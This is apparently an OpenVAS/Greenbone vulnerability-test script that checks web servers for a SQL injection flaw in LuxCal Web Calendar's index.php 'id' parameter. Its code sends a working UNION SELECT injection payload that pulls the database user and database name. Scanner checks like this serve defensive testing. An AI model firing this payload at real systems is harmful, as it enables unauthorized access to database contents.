if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802307" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "LuxCal Web Calendar SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45152" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17500/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code." );
	script_tag( name: "affected", value: "LuxCal Web Calendar version 2.4.2 to 2.5.0" );
	script_tag( name: "insight", value: "The flaw is due to input passed via the 'id' parameter to
  'index.php', which is not properly sanitised before being used in a SQL query." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running LuxCal Web Calendar and is prone to SQL
  injection vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/luxcal", "/cal", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(egrep( pattern: "LuxCal Web Calendar", string: res )){
		exploit = NASLString( "/index.php?xP=11&id=-326415+union+all+select+1,2,", "0x", vt_strings["default_hex"], ",user(),5,database(),7,8,9,10,11,12,13,", "14,15,16,17,18,19,20,21,22,23,24,25,26,27--" );
		req = http_get( item: NASLString( dir, exploit ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ">Title:<" ) && ContainsString( res, ">" + vt_strings["default"] + "<" )){
			report = http_report_vuln_url( port: port, url: exploit );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

